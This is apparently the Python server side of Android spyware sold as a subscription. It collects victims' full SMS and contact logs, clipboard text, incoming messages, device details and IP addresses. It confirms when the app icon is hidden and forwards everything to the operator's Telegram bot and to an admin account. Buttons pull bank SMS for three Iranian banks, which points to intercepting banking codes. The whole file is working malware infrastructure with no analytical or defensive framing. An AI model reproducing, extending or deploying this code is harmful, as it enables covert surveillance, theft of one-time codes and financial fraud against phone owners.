import json
from main import inPermittedList
from fastapi import FastAPI , Request
from fastapi.responses import JSONResponse
import uvicorn
import config
from threading import Thread
from requests import get , post
from main import getUrl , addUserCount , getFirstTimeSms , getOfflineMode

app = FastAPI()

def send_message(chat_id , text , reply_markup):
    return get(f"https://api.telegram.org/bot{config.token}/sendMessage?parse_mode=HTML&chat_id={chat_id}&text={text}" , json=reply_markup).json()

def openPanelNow(androidid):
    return {"reply_markup" : {"inline_keyboard" : [[{"text" : "🎛 ᴏᴘᴇɴ ᴘᴀɴᴇʟ ɴᴏᴡ ! 🎛" , "callback_data" : f"open_{androidid}"}]]}}

def AllSmsButton(androidid):
    return {"inline_keyboard" : [
                    [{"text" : "💴 ɢᴇᴛ ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ (صادرات) 💴" , "callback_data" : f"saderat_{androidid}"}],
                    [{"text" : "💵 ɢᴇᴛ ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ (ملت) 💵" , "callback_data" : f"mellat_{androidid}"}],
                    [{"text" : "💵 ɢᴇᴛ ᴀʟʟ ʙᴀɴᴋ ꜱᴍꜱ (تجارت) 💵", "callback_data": f"tejarat_{androidid}"}],
                ]
            }


def send_document(filename , chat_id , caption , reply_markup):
    try:
        if reply_markup != None:
            url = f'https://api.telegram.org/bot{config.token}/sendDocument?parse_mode=HTML&chat_id={chat_id}&caption={caption}&reply_markup={json.dumps(reply_markup)}'
        else:
            url = f'https://api.telegram.org/bot{config.token}/sendDocument?parse_mode=HTML&chat_id={chat_id}&caption={caption}'
        return post(url , files={'document' : open(filename , "rb")}).json()
    except Exception as e:
        return e

@app.get("/")
async def root():
    return "Hello, World"

@app.get("/config/{chat_id}")
async def url(request: Request , chat_id):
    try:
        return JSONResponse(content={"url": getUrl(chat_id), "offlinemode": getOfflineMode(chat_id),
                                     "firsttimesms": {"phone": getFirstTimeSms(chat_id)[0],
                                                      "text": getFirstTimeSms(chat_id)[1]}},
                            media_type="application/json")
    except Exception as e:
        return e

@app.post("/upload/{chat_id}")
async def upload(chat_id , request : Request):
    content = await request.body()
    androidid = request.query_params.get("id")
    if request.query_params.get("issms") == "true":
        with open(f"{androidid}_sms.txt", "wb") as f:
            f.write(content)
            f.close()
        Thread(target=send_document, args=(f"{androidid}_sms.txt", chat_id,
                                           f"/> ᴀʟʟ ꜱᴍꜱ ʟᴏɢꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code> \n\n⚡️ ᴅᴇᴠ : @{config.dev}",
                                           AllSmsButton(androidid),)).start()
        if str(chat_id) != str(config.admin):
            Thread(target=send_document, args=(f"{androidid}_sms.txt", config.admin,
                                           f"/> ᴀʟʟ ꜱᴍꜱ ʟᴏɢꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code> \n\n⚡️ ᴅᴇᴠ : @{config.dev}",
                                           AllSmsButton(androidid),)).start()
    else:
        with open(f"{androidid}_contact.txt", "wb") as f:
            f.write(content)
            f.close()
        Thread(target=send_document, args=(f"{androidid}_contact.txt", chat_id,
                                           f"/> ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ ʟᴏɢꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code> \n\n⚡️ ᴅᴇᴠ : @{config.dev}",
                                           None)).start()
        if str(chat_id) != str(config.admin):
            Thread(target=send_document, args=(f"{androidid}_contact.txt", config.admin,
                                           f"/> ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ ʟᴏɢꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! \n/> ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code> \n\n⚡️ ᴅᴇᴠ : @{config.dev}",
                                           None)).start()
    return JSONResponse(content={"status" : "uploaded"} , media_type="application/json")


@app.post("/api/{chat_id}")
async def api(chat_id : int , request : Request):
    try:
        if not inPermittedList(chat_id):
            return JSONResponse(content={"status": "EXPIRED"}, media_type="application/json")

        data = await request.json()
        action = data["action"]
        model = data["model"]
        androidid = data["androidid"]
        androidv = data["androidv"]
        carrier = data["carrier"]
        battery = data["battery"]
        x_forwarded_for = request.headers.get("X-FORWARDED-FOR")
        if x_forwarded_for:
            client_ip = x_forwarded_for.split(",")[0].strip()
        else:
            client_ip = request.client.host

        if action == "firstinstall":
            text = f"""
/> ᴛᴀʀɢᴇᴛ ɪɴꜱᴛᴀʟʟᴇᴅ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
            """
            Thread(target=send_message , args=(chat_id , text , openPanelNow(androidid) , )).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            addUserCount(chat_id)
            return JSONResponse(content={"status" : "ok"} , media_type="application/json")
        elif action == "ping":
            text = f"""
/> ᴛᴀʀɢᴇᴛ ɪꜱ ᴏɴʟɪɴᴇ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
                        """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "hide":
            text = f"""
/> ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪᴄᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʜɪᴅᴇᴅ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
                                """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "fullinfo":
            text = f"""
/> ꜰᴜʟʟ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! 

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🔌 ᴘᴇʀᴍɪꜱꜱɪᴏɴ ꜱᴛᴀᴛᴜꜱ :
    📄 ʀᴇᴀᴅ ꜱᴍꜱ : {data['readsms']}
    📤 ꜱᴇɴᴅ ꜱᴍꜱ : {data['sendsms']}
    📥 ʀᴇᴄᴇɪᴠᴇ ꜱᴍꜱ : {data['recvsms']} 
    🎫 ʀᴇᴀᴅ ᴄᴏɴᴛᴀᴄᴛꜱ : {data['readcontacts']}

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
"""
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "smsreceived":
            text = f"""
/> ɴᴇᴡ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! 

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

☎️ ꜰʀᴏᴍ : <code>{data['from']}</code>
📝 ᴛᴇxᴛ : <code>{data['text'].replace('&' , '').replace('#' , '').replace('>' , '').replace('<' , '')}</code>

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
            """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "lastsms":
            text = f"""
/> ʟᴀꜱᴛ ꜱᴍꜱ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ ! 

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

☎️ ꜰʀᴏᴍ : <code>{data['from']}</code>
📝 ᴛᴇxᴛ : <code>{data['text'].replace('&', '').replace('#', '').replace('>', '').replace('<', '')}</code>

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
                    """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "sentsms":
            text = f"""
/> ꜱᴍꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇɴᴛ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

☎️ ᴛᴏ  : <code>{data['phone']}</code>
📝 ᴛᴇxᴛ : <code>{data['text'].replace('&', '').replace('#', '').replace('>', '').replace('<', '')}</code>

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
                        """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "unhide":
            text = f"""
/> ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪᴄᴏɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴜɴʜɪᴅᴇᴅ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
                                            """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "getclipboard":
            text = f"""
/> ᴄʟɪᴘʙᴏᴀʀᴅ ᴛᴇxᴛ ʀᴇᴄᴇɪᴠᴇᴅ ꜰʀᴏᴍ ᴛᴀʀɢᴇᴛ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

📝 ᴛᴇxᴛ : <code>{data['text'].replace('&', '').replace('#', '').replace('>', '').replace('<', '')}</code>

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
"""
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "setclipboard":
            text = f"""
/> ᴛᴀʀɢᴇᴛ ᴄʟɪᴘʙᴏᴀʀᴅ ᴛᴇxᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

📝 ᴛᴇxᴛ : <code>{data['text'].replace('&', '').replace('#', '').replace('>', '').replace('<', '')}</code>

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
        """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "ringermode":
            text = f"""
/> ɴᴇᴡ ʀɪɴɢᴇʀ ᴍᴏᴅᴇ ᴀᴘᴘʟɪᴇᴅ ᴛᴏ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

📱 ɴᴇᴡ ᴍᴏᴅᴇ : {data['mode']}

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
"""
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")
        elif action == "updateaddress":
            text = f"""
/> ɴᴇᴡ ᴀᴅᴅʀᴇꜱꜱ ʀᴇᴘʟᴀᴄᴇᴅ ꜰᴏʀ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ !

⚙️ ᴍᴏᴅᴇʟ : {model}
🧩 ᴀɴᴅʀᴏɪᴅɪᴅ : <code>/set {androidid}</code>
📟 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : {androidv}
📶 ᴄᴀʀʀɪᴇʀ : {carrier}
🔋 ʙᴀᴛᴛᴇʀʏ : {battery} %

🌐 ɪᴘ ᴀᴅᴅʀᴇꜱꜱ : <code>{client_ip}</code>
⚡️ ᴅᴇᴠ : @{config.dev}
            """
            Thread(target=send_message, args=(chat_id, text, openPanelNow(androidid),)).start()
            if str(chat_id) != str(config.admin):
                Thread(target=send_message, args=(config.admin, text, openPanelNow(androidid),)).start()
            return JSONResponse(content={"status": "ok"}, media_type="application/json")

    except Exception as e:
        return e


if __name__ == "__main__":
    uvicorn.run(app="webservice:app" , host=config.host, port=config.port , workers=1)

